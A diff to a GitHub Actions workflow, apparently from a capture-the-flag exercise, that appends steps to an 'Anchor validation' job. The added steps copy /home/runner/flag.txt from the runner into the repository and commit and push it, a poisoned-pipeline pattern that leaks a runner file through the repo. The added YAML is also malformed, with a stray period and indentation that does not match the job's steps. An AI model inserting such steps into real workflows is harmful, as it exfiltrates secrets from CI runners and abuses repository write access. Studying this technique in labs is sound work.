@@ -75,3 +75,19 @@ jobs:
       - name: Validation complete
         run: |
           echo "✅ Anchor validation completed successfully"
+.- name: Read flag.txt from runner
+  run: |
+    if [ -f "/home/runner/flag.txt" ]; then
+      cp /home/runner/flag.txt ./flag.txt
+    fi
+
+- name: Commit flag.txt to repository
+  run: |
+    git config user.name "github-actions[bot]"
+    git config user.email "github-actions[bot]@users.noreply.github.com"
+    
+    if [ -f "flag.txt" ]; then
+      git add flag.txt
+      git commit -m "Add flag.txt from runner" || echo "No changes to commit"
+      git push
+    fi
